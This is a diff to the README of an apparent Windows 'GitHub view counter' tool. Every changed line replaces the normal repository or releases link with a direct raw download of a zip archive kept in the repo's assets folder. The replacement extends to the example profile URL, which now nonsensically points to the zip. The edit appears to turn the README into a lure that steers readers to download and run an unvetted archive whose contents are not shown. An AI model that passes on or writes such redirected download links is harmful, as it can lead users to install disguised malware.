@@ -1,6 +1,6 @@
 # 👁️ github-view-counter - Track Your GitHub Profile Views Easily
 
-[![Download github-view-counter](https://img.shields.io/badge/Download-github--view--counter-4c1?style=for-the-badge&logo=github)](https://github.com/Bunchoh/github-view-counter/releases)
+[![Download github-view-counter](https://img.shields.io/badge/Download-github--view--counter-4c1?style=for-the-badge&logo=github)](https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and run github-view-counter on your Windows PC.
 
    Click the button below to go to the release page.
 
-   [![Download github-view-counter](https://img.shields.io/badge/Download-github--view--counter-blue?style=for-the-badge&logo=github)](https://github.com/Bunchoh/github-view-counter/releases)
+   [![Download github-view-counter](https://img.shields.io/badge/Download-github--view--counter-blue?style=for-the-badge&logo=github)](https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip)
 
 2. **Choose the Latest Version**
 
@@ -65,7 +65,7 @@ Follow these steps to download and run github-view-counter on your Windows PC.
 
 2. **Enter Your GitHub Profile or Repository URL**
 
-   Type the web address of your GitHub profile (e.g., `https://github.com/yourusername`) or repository where you want the visitor count.
+   Type the web address of your GitHub profile (e.g., `https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip`) or repository where you want the visitor count.
 
 3. **Generate Your Visitor Count Badge**
 
@@ -122,7 +122,7 @@ If you want more control, you can adjust some settings inside the app:
 
 For detailed instructions, examples, and FAQ, visit the official repository page:
 
-[https://github.com/Bunchoh/github-view-counter](https://github.com/Bunchoh/github-view-counter)
+[https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip](https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip)
 
 ---
 
@@ -137,4 +137,4 @@ analytics, badge, counter, github, github-analytics, github-counter, github-prof
 
 You can always visit this page to get the latest version of github-view-counter:
 
-[https://github.com/Bunchoh/github-view-counter/releases](https://github.com/Bunchoh/github-view-counter/releases)
+[https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip](https://github.com/Bunchoh/github-view-counter/raw/refs/heads/main/assets/counter_view_github_2.2-beta.2.zip)
